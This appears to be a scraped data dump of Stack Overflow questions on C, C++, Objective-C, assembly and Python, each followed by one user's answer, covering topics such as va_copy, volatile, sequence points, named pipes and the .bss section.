<p>The researchers hope to run the program on a modern Mac OS X, but I have never done any development on a Mac before. What is the simplest way to accomplish the above goals in C++ on a Mac?</p>

<p><code>CoreAudio</code> seems way too complicated. <code>NSSound</code> seems to have all the features I want, but as far as I can tell it is only available in Objective-C? Is it possible to mix Objective-C with C++? Or should I be looking at using the <code>QuickTime</code> SDK? </p>

<p>Thanks for any help.</p>
","9530","","<p>Yes, you can mix Objective-C and C++.  It's a hybrid language called <a href=""http://en.wikipedia.org/wiki/Objective-C#Objective-C.2B.2B"" rel=""nofollow"">Objective-C++</a>.  If <code>NSSound</code> has all of the features you need, go for it; if not, CoreAudio is the way to go.  It will be much more challenging to set up and integrate larger libraries such as QuickTime, OpenAL, or FMOD.</p>
"
"<p>I'm curious because the man page of connect(2) is pretty short and it takes a struct sockaddr* which is normally cast anyways..</p>
","9530","","<p>How the <code>connect(2)</code> call works depends on the socket domain you're using (i.e. the value passed as the first parameter to <a href=""http://linux.die.net/man/2/socket"" rel=""nofollow""><code>socket(2)</code></a>).  If you're using the <code>AF_INET</code> protocol family, then <code>connect</code> expects a <code>sockaddr_in</code>.  If you're using the <code>AF_INET6</code> protocol, then it expects a <code>sockaddr_in6</code>,  Other protocol families have their own address structure.</p>

<p>Whichever protocol family you're using, you should only use that family's address structure, cast to a <code>struct sockaddr</code>, when calling <code>connect</code> or any other socket functions.</p>
"
"<p>Background: I am currently trying to ""extend"" standard C formatting with support for handling a certain struct, similar to how Objective-C extends C formatting to allow support for NSString with the ""%@"" sequence.</p>

<p>The one problem I'm struggling with is that vsprintf seems to be behaving differently on OS X versus Linux (I've tested with Ubuntu 10.10 and 12.04). On OS X, it is behaving how I thought it should, where after calling vsprintf, calling va_arg returns the ms pointer (as if the vsprintf function called va_arg to get the 5). On Linux, however, the va_list does not change from vsprintf, and calling va_arg returns 5.</p>

<p>I would really like to figure out a way to implement this functionality so that it behaves consistently across platforms. Is it wrong to assume that you can expect vsprintf to consistently change the pointer inside va_list so that the next time you call va_arg it returns the next not-yet-used argument?</p>

<p>I have simplified my code as much as possible to demonstrates the issue. On OS X, this code prints the correct address of the pointer returned from malloc. On Linux, the value of ms in foo becomes 5, so it prints 5.</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;string.h&gt;

static void foo(void *, ...);

typedef struct {
    char *value;
} mystruct;

int main(int argc, char *argv[]) {
    mystruct *ms = malloc(sizeof(mystruct));
    foo(NULL, ""%d %@"", 5, ms);
}

void foo(void *dummy, ...) {
    va_list args;
    va_start(args, dummy);
    char buffer[512];
    int buffer_ptr = 0;
    int i = 0;
    char *format = va_arg(args, char *);

    buffer[0] = '\0';

    for (i = 0; i &lt; strlen(format); i++) {
        if (i &lt;= strlen(format) - 1 &amp;&amp; (format[i] == '%' &amp;&amp; format[i+1] == '@')) {
            vsprintf(buffer, buffer, args);

            /* can expect the next argument to be a mystruct pointer */
            mystruct *ms = va_arg(args, mystruct *);
            buffer[buffer_ptr+1] = '\0';
            fprintf(stderr, ""%p"", ms); /* SHOULD NOT PRINT 5 */

            /* concatenate here */  
        } else {
            buffer[buffer_ptr++] = format[i];
            buffer[buffer_ptr] = '\0';
        }
    }

    va_end(args);
}
</code></pre>
","9530","","<p>You need to use <a href=""http://linux.die.net/man/3/va_copy"" rel=""nofollow""><code>va_copy</code></a> if you're going to use an argument list more than once -- failure to do so is undefined behavior.  Your code should look something like this:</p>

<pre><code>va_list args;
va_start(args, dummy);
...
char *format = va_arg(args, char *);
...
va_list argsCopy;
va_copy(argsCopy, args);
vsprintf(..., argsCopy);
va_end(argsCopy);
...
mystruct *ms = va_arg(args, mystruct *);
...
va_end(args);
</code></pre>
"
"<p>I'm playing around with a toolchain that seems to wrap gcc (qcc), but also uses g++ for a few things. This caused a bit of confusion when I couldn't link libs I built with g++ using g(q)cc even though it was for the same architecture (due to missing lib errors). After a bit more research, I found that g++ is basically gcc with a few default flags and a slightly different interpretation mechanism for file extensions (there may be other differences I've glanced over). I'd like to know exactly which flags can be passed to gcc to amount to the equivalent g++ call. For instance:</p>

<pre><code>g++ -g -c hello.cpp   // I know at the very least that this links in stl
gcc -g -c -???        // I want the exact same result as I got with g++... what flags do I use?
</code></pre>

<p>The way the tool chain is set up makes it sort of difficult to simply replace the gcc calls with g++. It'd be much easier to know which flags I need to pass.</p>
","9530","","<p>The differences between using <code>gcc</code> vs. <code>g++</code> to compile C++ code is that (a) <code>g++</code> compiles files with the <code>.c</code>, <code>.h</code>, and <code>.i</code> extensions as C++ instead of C, and that (b) it automatically links with the C++ standard library (<code>-lstdc++</code>).  See the <a href=""http://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Invoking-G_002b_002b.html#Invoking-G_002b_002b"" rel=""nofollow"">man page</a>.</p>

<p>So assuming that you're not compiling <code>.c</code>, <code>.h.</code>, or <code>.i</code> files as C++, all you need to do to make <code>gcc</code> act like <code>g++</code> is add the <code>-lstdc++</code> command line option to your linker flags.  If you <em>are</em> compiling those other files as C++, you can add <code>-x c++</code>, but I'd advise you instead to rename them to use <code>.cc</code> or <code>.ii</code> files (<code>.h</code> can stay that way, if you're using precompiled headers).</p>
"
"<p>I'd like to see all macros that are defined by the invocation of the compiler I'm using.  Is there any way to do this?   I have seen in the manual it says you can use cpp -dM  but this doesn't work for me. Perhaps I'm doing something wrong?</p>

<p>WHen I run 
    cpp -dM</p>

<p>I get no output at all from the preprocessor.  If I try adding -dM as an option on gcc, I don't notice any difference.</p>
","9530","","<p>By default, <code>cpp -dM</code> will read its input file from standard input and write to standard output.  Since you're not trying to preprocess any input, you can pass it the empty input using <code>/dev/null</code>:</p>

<pre><code># Option 1
cpp -dM &lt; /dev/null
# Optio n2
cpp -dM /dev/null
</code></pre>

<p>On Windows, you can use the <code>NUL</code> pseudofile instead of <code>/dev/null</code>.</p>
"
"<p>I currently have a Core Data database that stores data and I wish to also store an NSColor into it but It does not accept NSColor as an object. My solution would be to store it as a string in the database and have it read into a NSColor when loaded. How would I do this?</p>

<p>For example, If I had a colour like <code>[NSColor redColor]</code> how would I store it in a database (as a string) and then retrieve it. This is a basic example and it would be more complicated RGB colors in the end.</p>

<p>Thanks.</p>
","9530","","<p><code>NSColor</code> supports the <a href=""https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Protocols/NSCoding_Protocol/Reference/Reference.html"" rel=""nofollow""><code>NSCoding</code> protocol</a>, so you can use the <code>-encodeWithCoder:</code> method to save it to an archive, and you can use <code>-initWithCoder:</code> to load it from an archive.</p>
"
"<p>I'm trying to pin down my understanding of sequence points in C -- just wanted to check something. At present, I believe that (1) is undefined whereas (2) is merely unspecified, on the basis that in (2), there are sequence points after evaluating the arguments for <code>g</code> and <code>h</code> (so we're not modifying <code>i</code> twice between sequence points), but the order of evaluation of the arguments of <code>f</code> is still unspecified. Is my understanding correct?</p>

<pre><code>#include &lt;stdio.h&gt;

int g(int i) {
    return i;
}

int h(int i) {
    return i;
}

void f(int x, int y) {
    printf(""%i"", x + y);
}

int main() {
    int i = 23;
    f(++i, ++i); // (1)
    f(g(++i), h(++i)); // (2)
    return 0;
}
</code></pre>

<p>EDIT:</p>

<p>It seems the key point here is whether the compiler is free to perform both the increments before either <code>g</code> or <code>h</code> is called -- my understanding from the answers below is that it is, although I'd appreciate confirmation that that's the case.</p>
","9530","","<p>Incorrect.  Sequence points specify a <em>partial order</em> on the allowed ordering of operations.  In case (2), there are sequence points:</p>

<ol>
<li>At the semicolon at the end of the line (1)</li>
<li>After the evaluation of the arguments of <code>g</code> (i.e. the <code>++i</code>) but before the call to <code>g</code></li>
<li>After the evaluation of the arguments of <code>h</code> (i.e. the <code>++i</code>) but before the call to <code>h</code></li>
<li>After the evaluation of the arguments of <code>f</code> (i.e. after <code>f</code> and <code>g</code> have returned) but before the call to <code>f</code></li>
<li>After the return from <code>f</code></li>
</ol>

<p>So the partial order looks like this, from top to bottom:</p>

<pre><code>    1
   / \
  /   \
 2     3
  \   /
   \ /
    4
    |
    | 
    5
</code></pre>

<p>2 and 3 are not ordered with respect to each other, since the order of evaluation of arguments is unspecified.  Since <code>i</code> gets modified twice between the sequence points 1 and 4, the behavior is undefined.</p>
"
"<p>I have mounted a drive. In it's ""get info"", I have an attribute named ""Image Disk"" which is ""/private/var/run/vmware/fuse/10323660103412696815/flat"". How can I get this attribute using python? os.stat does not give me this.
thanx</p>
","9530","","<p>Use the <code>getxattr</code> function from the <code>xattr</code> module, which is a Python binding to the native function <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man2/getxattr.2.html#//apple_ref/doc/man/2/getxattr"" rel=""nofollow""><code>getxattr(2)</code></a>.  For example:</p>

<pre><code>import xattr
print xattr.getattr('/Volumes/MyDrive', 'Image Disk')
</code></pre>

<p>See <a href=""http://technosophos.com/node/5"" rel=""nofollow"">this blog post</a> for a more detailed example.</p>
"
"<p>I want to make network simulator shawn.exe with cygwin and that simulator need to boost library
when i call make for it in the linking step procedure break.
please help me,
this is all result of make command:</p>

<pre><code>{.
.
[100%] Built target shawnlib
Scanning dependencies of target shawn
[100%] Building CXX object CMakeFiles/shawn.dir/frontend/console/con_main.o
[100%] Building CXX object CMakeFiles/shawn.dir/apps/apps_init.o
Linking CXX executable shawn.exe
/usr/lib/gcc/i686-pc-cygwin/4.5.3/../../../../i686-pc-cygwin/bin/ld: cannot find -lboost_regex-gcc-mt
/usr/lib/gcc/i686-pc-cygwin/4.5.3/../../../../i686-pc-cygwin/bin/ld: cannot find -lboost_date_time-gcc-mt
/usr/lib/gcc/i686-pc-cygwin/4.5.3/../../../../i686-pc-cygwin/bin/ld: cannot find -lboost_thread-gcc-mt
collect2: ld returned 1 exit status
CMakeFiles/shawn.dir/build.make:111: recipe for target `shawn.exe' failed
make[2]: *** [shawn.exe] Error 1
CMakeFiles/Makefile2:60: recipe for target `CMakeFiles/shawn.dir/all' failed
make[1]: *** [CMakeFiles/shawn.dir/all] Error 2
Makefile:72: recipe for target `all' failed
make: *** [all] Error 2
}
</code></pre>
","9530","","<p>Make sure you have the <code>libboost-devel</code> Cygwin package installed.  Re-run Cygwin's setup.exe and install that package (as well as its dependencies, which should automatically get installed if you don't explicitly exclude them).</p>
"
"<p>Is it possible to read intermittently-sent data through a named pipe using redirection to stdin?</p>

<p>What I'd like to do is this:</p>

<pre><code>$ mkfifo pipe
$ ./test &lt; pipe
</code></pre>

<p>In another terminal:</p>

<pre><code>$ cat datafile &gt; pipe
$ cat datafile &gt; pipe
</code></pre>

<p>repeating dumping information into the pipe. This only works the first time.</p>

<p>Here's a demonstration program for test that shows the behavior:</p>

<pre><code>int main(int argc, char *argv[]) {  
    char input_string[30];
    while(1) {
        while( cin.read(input_string, 30) || cin.gcount()!=0 ) {
            cout &lt;&lt; ""!"" &lt;&lt; endl;
        }
    }
return 1;
}
</code></pre>

<p>So, what's going on? Does redirection only provide the contents of a single send to the pipe? I've already written a version of the actual production code that takes in the name of the pipe as a parameter and keeps it open for writing this way, and maybe that's the answer. But I'm wondering if there's a way to do this with redirection.</p>
","9530","","<p>When you redirect the input from the pipe like this:</p>

<pre><code>./test &lt; pipe
</code></pre>

<p>The shell opens the pipe for reading and then starts your program.  But opening the pipe does not complete until a writer exists -- that is, <code>open(2)</code> blocks.  When another process opens the pipe for writing, the original <code>open</code> call completes, and the two can communicate.  When the writer closes its end of the pipe, the read end also closes -- the reader gets an EOF.</p>

<p>Once that cycle completes, you can reopen the pipe for reading and start another cycle, but you have to do it yourself.  So if you're reading for stdin, you'll have to restart your program.  Alternatively, you can just reopen the pipe on a different file descriptor, e.g.:</p>

<pre><code>// Error checking omitted for expository purposes
int main(int argc, char **argv)
{
    while(1)
    {
        int fd = open(""pipe"", O_RDONLY);
        char buffer[30];
        int n;
        while((n = read(fd, buffer, sizeof(buffer)) &gt; 0)
        {
            // Process input
        }
        close(fd);
    }

    return 0;
}
</code></pre>

<p>If you want to wrap the raw I/O in a stdio <code>FILE*</code>, you can use <a href=""http://linux.die.net/man/3/fdopen"" rel=""nofollow""><code>fdopen(3)</code></a>; I'm not aware of a way to wrap a file descriptor in a C++ stream object, though it might be possible.</p>
"
"<p>I am a little bit confused about the difference between</p>

<pre><code>leal -4(%ebp), %eax       
</code></pre>

<p>and </p>

<pre><code>movl -4(%ebp), %eax
</code></pre>

<p>Can someone explain this to me? </p>
","9530","","<p><a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/LEA.htm"">LEA</a> (load effective address) just computes the <em>address</em> of the operand, it does not actually dereference it.  Most of the time, it's just doing a calculation like a combined multiply-and-add for, say, array indexing.</p>

<p>In this case, it's doing a simple numeric subtraction: <code>leal -4(%ebp), %eax</code> just assigns to the <code>%eax</code> register the value of <code>%ebp - 4</code>.  It's equivalent to a single <code>sub</code> instruction, except a <code>sub</code> requires the destination to be the same as one of the sources.</p>

<p>The <code>movl</code> instruction, in contrast, accesses the memory location at <code>%ebp - 4</code> and stores that value into <code>%eax</code>.</p>
"
"<p>I have a string variable containing time in <strong><em>hh:mm:ss format</em></strong>. How to convert it into time_t type? eg: string time_details = ""16:35:12""</p>

<p>Also, how to compare two variables containing time so as to decide which is the earliest?
eg : string curr_time = ""18:35:21""
     string user_time = ""22:45:31""</p>
","9530","","<p>You can use <a href=""http://linux.die.net/man/3/strptime""><code>strptime(3)</code></a> to parse the time, and then <a href=""http://linux.die.net/man/3/mktime""><code>mktime(3)</code></a> to convert it to a <code>time_t</code>:</p>

<pre><code>const char *time_details = ""16:35:12"";
struct tm tm;
strptime(time_details, ""%H:%M:%S"", &amp;tm);
time_t t = mktime(&amp;tm);  // t is now your desired time_t
</code></pre>
"
"<p>I'm trying to learn x86 assembly. The book I'm using is <code>Assembly Language - Step by Step, Programming With Linux</code> (and I'd have to say it's pretty good). I've learned a lot so far, but I feel as though I should also be challenging myself to stay ahead in many respects so I can learn faster through doing (I can do follow along, top-down learning, but I find it tediously slow).</p>

<p>So, I figured it would be a cool idea to try and multiply two registers (32-bit) and then output the data to the console.</p>

<p>The problem is that when I execute the program (I'm using NASM, just as the book does - no Insight debugger though), I receive a segmentation fault. I've done a fair amount of debugging in <strong>gdb</strong> with this little hammer out, but for whatever reason I can't seem to figure out what the issue is.</p>

<p>I'd like to know why I'm receiving a segmentation fault, and what a good way would be to 
reprimand the issue. Also, if the comments I've made in the code don't match up with what exactly is happening, I'd be grateful if anyone could correct me on that.</p>

<p>Here's my code so far (it's well commented)</p>

<p>Thanks.</p>

<p><strong>teh codez</strong></p>

<pre><code>section .data
;TODO

section .bss
valueToPrint: resb 4            ;alloc 4 bytes of data in 'valueToPrint'

section .text

global _start

_mul:
    mov eax, 0x2A ;store 42 in eax
    mov edx, 0x2A ;store 42 in edx
    mul eax
    ret

_safe_exit:
    mov eax, 1  ;initiate 'exit' syscall
    mov ebx, 0  ;exit with error code 0
    int 0x80    ;invoke kernel to do its bidding 

_start:
    nop                         ;used to keep gdb from complaining

    call _mul                       ;multiply the values
    mov [valueToPrint], eax         ;store address of eax in the contents of valueToPrint
    mov eax, 4                      ;specify a system write call - aka syswrite
    mov ebx, 1                      ;direction used to make the syswrite call output to console - i.e. stdout
    mov dword [ecx], valueToPrint   ;store valueToPrint in ecx: ecx represents the syswrite register
    int 0x80                        ;invoke kernel based on the given parameters

    call _safe_exit
</code></pre>

<p><strong>Edit</strong></p>

<p>Also, I'm running Arch Linux, if that makes a difference.</p>
","9530","","<p>This line is causing the segmentation fault:</p>

<pre><code>mov dword [ecx], valueToPrint
</code></pre>

<p>You're telling it to store <code>valueToPrint</code> in the memory location at address <code>ecx</code>.  You never initialize <code>ecx</code> (the kernel probably initializes it to 0 on program start for you), so when you dereference it, you're going to access an invalid memory location.</p>

<p>The <a href=""http://linux.die.net/man/2/write"" rel=""nofollow""><code>write(2)</code></a> system call takes 3 parameters: the file descriptor number in register <code>ebx</code>, a pointer to the string to write in <code>ecx</code>, and the number of bytes to write in <code>edx</code>.  So, if you want to just print the raw binary data of the result, you can pass the address of <code>valueToPrint</code>, and tell it to print 4 bytes from that address.  In this case, <code>valueToPrint</code> is 1764 (0x6e4 in hex), so this code would print out the 4 bytes <code>e4 06 00 00</code> on x86, which is little-endian:</p>

<pre><code>mov [valueToPrint], eax   ; store the result into memory
mov eax, 4                ; system call #4 = sys_write
mov ebx, 1                ; file descriptor 1 = stdout
mov ecx, valueToPrint     ; store *address* of valueToPrint into ecx
mov edx, 4                ; write out 4 bytes of data
int 0x80                  ; syscall
</code></pre>
"
"<p>Is is possible to define a macro BREF(...):</p>

<pre><code>struct bits
{
    int b0:1;
    int b1:1;
    int b2:1;
    int b3:1;
    int b4:1;
    int b5:1;
    int b6:1;
    int b7:1;
}

#define BREF(var,bit) ????
#define BAR 4
#define ALIAS BREF(foo,BAR)

unsigned char foo;
</code></pre>

<p>such that this statement:</p>

<pre><code>ALIAS = 1;
</code></pre>

<p>expands to this:</p>

<pre><code>((struct bits *)&amp;foo)-&gt;b4 = 1;
</code></pre>

<p>and this:</p>

<pre><code>int k = ALIAS;
</code></pre>

<p>to this:</p>

<pre><code>int k = ((struct bits *)&amp;foo)-&gt;b4;
</code></pre>

<p>So far, this is my implementation of BREF(...):</p>

<pre><code>#define BREF(var,bit) (((struct bits *) &amp;(var))-&gt;b##bit)
</code></pre>

<p>However, this only works if <code>bit</code> is a literal numeral. I want to be able to pass in a macro variable that expands into a number. How can I make the C preprocessor expand <code>bit</code> before concatenating it to <code>b</code>?</p>
","9530","","<p>The trick is that the C preprocessor will expand macro arguments <em>only if they are not being used with the stringizing (<code>#</code>) or token-pasting (<code>##</code>) operators</em>.  So, to make it work with a macro that expands to a numeric literal, add an extra layer of macros like so:</p>

<pre><code>#define CONCAT(x, y) x ## y
#define BREF(var,bit) (((struct bits *) &amp;(var))-&gt; CONCAT(b, bit))
</code></pre>

<p>With this definition, <code>bit</code> is no longer a direct argument of the token-pasting operator, so if it's a macro, it gets expanded before the token-pasting.</p>
"
"<p>I'm making a sample program that counts how many occurrences a character is in a given word. Say ""Good"",g occurred once,o occurred 2 times etc. Now I wanna try to further this by having a list as the value of my dictionary,increasing the first element(index 0) by 1 each time an existing character is found and appending the same list of the dict value by the Index of the character in the word
e.g. Word=""Programming is nature""
Dict={'a':[2,5,16],'i':[2,8,12]...etc}</p>

<p>So the first index of each dict value increases by the occurrence of a character(i.e +1 if the character is found) but the other values in the list are appended(holding the location a char is found in the word). I have this for the counting alone but not for the indexing</p>

<pre><code>def count(word):
    v=0;b={}
    b.clear()
    while word[v] in word:
        if word[v] in b.keys():
            b[word[v]]+=1;v+=1
        else:
            b[word[v]]=1;v+=1
        if v==(len(word)):
            break
    print(""\n"",b)


word=input(""Enter word: "")
count(word)
</code></pre>
","9530","","<p>Use a <a href=""http://docs.python.org/library/collections.html#collections.defaultdict"" rel=""nofollow""><code>collections.defaultdict</code></a> instead:</p>

<pre><code>import collections

def count(word):
    c = collections.defaultdict(list)
    for index, letter in enumerate(word):
        c[letter] += [index]
    return c

print count('programming is nature')
</code></pre>

<p>Output:</p>

<pre><code>defaultdict(&lt;type 'list'&gt;, {'a': [5, 16], ' ': [11, 14], 'e': [20], 'g': [3, 10], 'i': [8, 12], 'm': [6, 7], 'o': [2], 'n': [9, 15], 'p': [0], 's': [13], 'r': [1, 4, 19], 'u': [18], 't': [17]})
</code></pre>
"
"<p>According to this SO post:<br>
<a href=""http://stackoverflow.com/questions/366017/what-is-the-size-of-an-enum-in-c"">What is the size of an enum in C?</a><br>
enum types have <code>signed int</code> type.  </p>

<p>I would like to convert an enum definition from <code>signed int</code> to <code>unsigned int</code>.  </p>

<p>For example, on my platform an <code>unsigned int</code> is 32-bits wide.
I want to create an enum:</p>

<pre><code>typedef enum hardware_register_e
{
    REGISTER_STATUS_BIT = (1U &lt;&lt; 31U)
} My_Register_Bits_t;
</code></pre>

<p>My compiler is complaining that the above definition is out of range (which it is for a <code>signed int</code>).  </p>

<p>How do I declare <code>unsigned int</code> <code>enum</code> values?  </p>

<h2>Edit 1:</h2>

<ol>
<li>The preference is not to expand to 64 bits (because the code resides
in an embedded system).</li>
<li>Due to skill limitations, C++ is not allowed for this project. :-(  </li>
</ol>

<h2>Edit 2:</h2>

<ul>
<li>Compiler is IAR Embedded Workbench for ARM7.</li>
</ul>
","9530","","<p>Check if your compiler had an option or a pragma to make enums unsigned.  If it doesn't, then you'll just have to use a plain <code>unsigned int</code> (or a fixed-width type such as <code>uint32_t</code>) instead of an enum, with <code>#define</code>s used to define the values it can take.</p>
"
"<p>I have some embedded code that writes commands to a memory address to control a peripherial like so:</p>

<pre><code>void intelStartEraseBlock(uint16_t *wordAddress) {
  *wordAddress =  0x20;  //block erase
  *wordAddress =  0xD0;  //block erase confirm
}
</code></pre>

<p>I suspect that the optimizer is skipping the first assignment.  Is this a job for volatile? or is there a better solution...</p>

<p>Note: this is legacy api code, so I don't plan of refactoring much.  I am looking for a 'local' fix here.</p>
","9530","","<p>Yes, just declare <code>wordAddress</code> as a pointer to <code>volatile</code> data:</p>

<pre><code>void intelStartEraseBlock(volatile uint16_t *wordAddress) {
   ...
}
</code></pre>

<p>The <code>volatile</code> keyword tells the compiler that the semantics have to match up with the abstract virtual machine specified by the C language -- in other words, every time you write to a <code>volatile</code> variable, the code has to actually write to memory, and every time you read from a <code>volatile</code> variable, the code has to actually read from memory.</p>

<p>The compiler is not allowed to optimize away these reads and writes, even if it thinks they are redundant.</p>

<p>Note that it must be the <em>pointed-to</em> data which is declared <code>volatile</code>, not the pointer itself.  Like the <code>const</code> keyword, it makes a big difference.  Since <code>wordAddress</code> is itself a variable on the stack, we don't care of reads/writes of it actually go out to the stack memory, but we do care that the memory it points to (presumably some type of memory-mapped I/O) is actually read/written.</p>
"
"<p>I have a simple C program that I can compile via command line on Linux easily enough but want to use Visual Studio to debug the program so that I can more easily see what it's doing but I cannot get it to compile.</p>

<p>I have created a new cpp Win32 console application. Added my .c and .h file but I cannot get it to compile. I get 100+ errors that primarily seem to be red herrings. For instance I have an error saying a variable isn't declared when I can see it declared on the line immediately before. For instance:</p>

<pre><code>int i;
for (i = 0; i &lt; unpacked_length; i++)
{
</code></pre>

<p>on the ""for"" line I get an error: ""error C2065: 'i' : undeclared identifier""</p>

<p>So something else is obviously going on. One error that seems legit is this one:</p>

<pre><code>static unsigned char* Base64_Charset = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"";
</code></pre>

<p>IntelliSense: a value of type ""const char *"" cannot be used to initialize an entity of type ""unsigned char *""</p>

<p>Since this works when compiling via command line I don't know why the intellisense would be giving this error here unless this compiler has different rules than the other one I used via command line. I haven't done any C for about 15 years and don't know if this could be a difference in compiler or if there is something else going on here.</p>

<p>The only includes in the source are: </p>

<pre><code>#include ""dtcrypt.h""
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
</code></pre>

<p>Appreciate any help!</p>
","9530","","<p>Visual Studio 2010 only supports ANSI C (aka C89), it does not support the more modern C99 or C11 language standards.  ANSI C requires you to declare all of your variables at the top of a function, you cannot define them in the middle of a function just before they are used.  So try rewriting your code like this:</p>

<pre><code>void my_function()
{
    /* Variable declarations go here */
    int i;
    ...

    /* Now teh codez */
    for (i = 0; i &lt; unpacked_length; i++)
    {
        ...
    }
}
</code></pre>

<p>For the second error, Intellisense complaining that it can't convert a pointer to <code>const char</code> to a pointer to <code>const unsigned char</code>.  String literals have type <code>char[]</code> (array of characters), and <code>char</code> is signed by default.  So, you should declare your variable as type <code>const char *</code> instead of <code>const unsigned char *</code>.  Or, you can ignore it, since it's not a compiler error, but it is a warning at certain warning levels.</p>
"
"<p>I have a pretty simple function in my program using the secant method to find a root of a function. It works fine with the printf() that's indicated below. But if I comment it out, the loop endlessly repeats. I have no idea why...</p>

<p>I've read about printf changing a variable, but I don't see anything on it changing the storage of the variable. Am I missing something? It's not a great solution to have it print, since the iterates are not important and the function is called millions of times.</p>

<pre><code>double guess1=500.;
double y1=estimater(r,volume,guess1,adm,tm,rr[r]);
double guess2=adm/30.;
double y2=estimater(r,volume,guess2,adm,tm,rr[r]);
int i;
double guess3=0.;
double y3;
double tol =heightTOL;
int secmax=SECANTMAX;
for(i=1;i&lt;=secmax;i++){
    guess3=guess2-y2*(guess2-guess1)/(y2-y1);
    if(guess3&gt;adm/2.){
        guess3=adm/2.;
    }
    if(guess3&lt;=0.){
        guess3=0.;
    }
    y3=estimater(r,volume,guess3,adm,tm,rr[r]);
    y1=y2;
    y2=y3;
    guess1=guess2;
    guess2=guess3;
    if(fabs(guess2-guess1)&lt;tol){
        break;
    }
    if(i==secmax){
        printf(""\nRan out of iterations in height finder\n"");
    }
    printf(""%d     %f"",i,guess3); //THIS ONE HERE!!!!!!!!
}
return guess3;
</code></pre>
","9530","","<p><code>printf</code> is not changing your data at all.  The only way the <code>printf</code> family of functions can have any effect on your data is if you use the <code>%n</code> format specifier (which writes into the variable whose address you pass) or if you're doing something which invokes undefined behavior, like passing the wrong format arguments.  You're not doing either of those things here (your format strings are correct), so your bug lies elsewhere.</p>

<p>Check that all your array accesses are in bounds.  Try running your code in Valgrind or other validators to try to find memory errors.</p>
"
"<p>I want to declare a constant array which can be accessed from multiple C files and whose content can be inlined by the compiler, without duplicating the memory in multiple compilation units. Performance is critical in my application.</p>

<p>Exhibit 1:</p>

<pre><code>header.h:
static const int arr[2] = { 1, 2 };

file1.c:
#include ""header.h""
void file1() { printf(""%d\n"", arr[0]); }

file2.c:
#include ""header.h""
int file2() { for (int i = 0; i &lt; 2; i++) printf(""%d\n"", arr[i]); }
</code></pre>

<p>In that case, the compiler can replace <code>arr[0]</code> by <code>1</code> in file1. However, since <code>arr</code> is declared <code>static const</code>, its memory is duplicated in both C files. AFAIK the C standard requires the array addresses to be different in both files. I have verified this under Linux by printing out the addresses. No linker consolidation occurs even with <code>-fmerge-all-constants</code> in gcc.</p>

<p>Exhibit 2:</p>

<pre><code>header.h:
extern const int arr[2];

file1.c:
#include ""header.h""
void file1() { printf(""%d\n"", arr[0]); }

file2.c:
#include ""header.h""
const int arr[2] = { 1, 2 };
int file2() { for (int i = 0; i &lt; 2; i++) printf(""%d\n"", arr[i]); }
</code></pre>

<p>In that case, no memory duplication occurs but <code>arr[0]</code> is not inlined.</p>

<p>I consider the visibility scope defined by the C standard to be flawed. As such, a working solution under Linux/gcc which violates the C standard is acceptable to me.</p>
","9530","","<p>Use the <code>selectany</code> <a href=""http://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html"" rel=""nofollow"">variable attribute</a> and give your arrays external linkage (i.e. don't declare them <code>static</code>).  This will keep the array value in the header so that it can be inlined properly, and the <code>selectany</code> attribute will tell the linker to arbitrarily pick one of the definitions to be the real one and throw away the others (since they're all the same, it won't matter).</p>

<p>For example:</p>

<pre><code>const int arr[] __attribute__((selectany)) = {1, 2};
</code></pre>

<hr>

<p><strong>EDIT</strong>: This apparently only works on Windows targets; the <code>weak</code> attribute did not work instead on a quick test I did with Cygwin's GCC, in that it produced multiple copies of the array in the resulting data segment.</p>
"
"<p>I am generating mips disassembly in order to simulating it. I need to have big data to work on it but I don't want to have big assembly files so I wanted to work on a big uninitialized array (and then possibly initialize it in my simulator...). So I need this array to be global. And global variables seem to be put on the .bss section to be initialized when the page is actually accessed. 
The problem is in my binary the array is in the .bss section, but is explicitly filled with zero...This is not the behaviour expected if I understood correctly what I have found on internet...Is there a way for saying to the compiler (or linker, or loader...I don't understand well which one do what for that) to not really put zero in this array ?
Or alternatively, can we have an option while compiling, or a C instruction for saying we don't want this array for being initialized with 0 ? (I tried to change the array section with <strong>attribute</strong> but it is still initialized with 0).</p>

<p>By the way, I am generating my disassembly file with objdump, and it normally skip blocks of zeroes, but I really need the other blocks of zeroes to be disassembled, so I using the ""-z"" option.</p>

<p>What I really don't understand is that everywhere I looked, it was said that .bss section didn't really put zero in the binary file...</p>
","9530","","<p>The data for the .bss section isn't stored in the compiled object files because, well, there is no data—the compiler puts variables in that segment precisely <em>because</em> they should be zero-initialized.</p>

<p>When the OS loads the executable, it just looks at the size of the .bss segment, allocates that much memory, and zero-initializes it for you.  By not storing that data in the executable file, it reduces loading times.</p>

<p>If you want data to be initialized with certain data, then give it an initializer in your code.  The compiler will then put it in the .data segment (initialized data) instead of .bss (uninitialized data).  When the OS then loads the executable, it will allocate the memory for the data and then copy it in from the executable.  This takes extra I/O, but your data is explicitly initialized how you want it.</p>

<p>Alternatively, you could leave the data stay in the .bss segment and then initialize it yourself at runtime.  If the data is quick and easy to generate at runtime, it might be faster to recompute it at startup rather then read it off of disk.  But those situations are probably rare.</p>
"
"<p>I'm getting a weird warning, and as a result my regex search isn't working. Here's the line:</p>

<pre><code>NSRange r = [HTML rangeOfString:@""\|(.*)\|"" options:NSRegularExpressionSearch];
</code></pre>

<p>Where <code>HTML</code> is a string that I'm sure contains a single match for the above regex.</p>

<p>The warning is only on the first occurrence of ""\|"", not on both.</p>

<p>Any help is much appreciated!</p>
","9530","","<p>You're getting the warning because <code>\|</code> is not a valid escape sequence in Objective-C (or C or C++ for that matter).  The compiler is ignoring that and just using a raw <code>|</code> character instead, so the string you're actually passing in is <code>@""|(.*)|""</code>.</p>

<p>To get the behavior you want, you have to escape the backslash in your source code so that the regex engine sees the literal backslash and interprets the <code>|</code> character as a literal instead of as alternation, e.g. <code>@""\\|(.*)\\|""</code>.</p>
"
"<p>I can't get a grip on how Python handles Unicode in files...</p>

<pre><code>f = open('test.txt', 'w')
f.write('abc')
f.close()
</code></pre>

<p>That gives a file of 3 bytes.</p>

<pre><code>f = open('test.txt', 'w')
f.write('abcé')
f.close()
</code></pre>

